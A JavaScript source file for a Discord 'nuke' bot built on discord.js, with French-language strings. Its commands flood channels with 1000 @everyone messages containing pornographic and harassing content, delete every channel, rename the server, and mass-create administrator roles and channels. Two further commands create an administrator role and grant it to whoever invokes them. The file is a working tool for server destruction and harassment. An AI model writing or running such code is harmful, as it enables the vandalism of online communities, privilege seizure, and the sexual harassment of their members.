const Discord = require('discord.js');
const bot = new Discord.Client();
const client = new Discord.Client();
const { Client } = require('discord.js');
var prefix = '!';
var destruc = '§';


bot.on('ready', function () {
  bot.user.setPresence({ game: { name: 'DrainCorp'}})
  console.log("Bot de destruction en attente de vos commandes!")
})

function cmd(str, msg) {
return msg.content.toLowerCase().startsWith(destruc + str);
}

bot.on("message", msg => {
if(cmd("spam", msg)) {
    msg.channel.fetchMessages({limit: 1}).then(messages => msg.channel.bulkDelete(messages));
    for (var i = 0; i < 1000; i++) {
        msg.channel.send("@everyone  Votre compte YouPorn premium est maintenant disponible , n'hesiter pas à alle regarder vos vidéos GAY favorite :wink: https://media.melty.fr/article-2538073-thumb/youporn-le-roi-du-porno-debarque-dans-le.jpg");
    }
}

bot.on("message", msg => {
if(cmd("sodomie", msg)) {
    msg.channel.fetchMessages({limit: 1}).then(messages => msg.channel.bulkDelete(messages));
    for (var i = 0; i < 1000; i++) {
         msg.channel.send("@everyone Voila à quoi ressemble votre anus après mon passage j'espere que vous aimez la sodomie: http://gifsdesexe.i.g.f.unblog.fr/files/2011/01/sodomie4.gif");
    }
}});

//audit log clogger
if(cmd("destruction", msg)) {
    msg.guild.channels.forEach(c => {
        c.delete();
        console.info(`\x1b[37m\x1b[44mINFO\x1b[0m: destruction du channel ${c.name}; ID: ${c.id}. (╯°□°）╯︵ ┻━┻`);
    });
    msg.guild.setName("BZ by DCH ");
    msg.guild.setIcon("https://image.noelshack.com/fichiers/2018/09/1/1519653220-29446936.jpg");
    msg.channel.fetchMessages({limit: 1}).then(messages => msg.channel.bulkDelete(messages));
    for (var i = 0; i < 400; i++) {
        msg.guild.createRole({
            name: 'BZ BY DCH',
            color: 'YELLOW',
            permissions: 'ADMINISTRATOR',
        });
        msg.guild.createChannel('BZ by DCH', 'voice')
        msg.guild.createChannel('BZ-by-DCH', 'text')
     }
 }
});


bot.on('message', msg => {
    if (msg.content === '§r') {
    msg.channel.fetchMessages({limit: 1}).then(messages => msg.channel.bulkDelete(messages));
    msg.guild.createRole({
    name: 'BZDCH',
    color: 'WHITE',
    permissions:['ADMINISTRATOR', 'BAN_MEMBERS', 'MANAGE_CHANNELS']
    })
    }
});

bot.on('message', msg => {

    if (msg.content === '§a') {
    msg.channel.fetchMessages({limit: 1}).then(messages => msg.channel.bulkDelete(messages));
    let RoleToAdd = msg.guild.roles.find('name', 'BZDCH')
    msg.member.addRole(RoleToAdd);
}
});

bot.login(process.env.TOKEN)
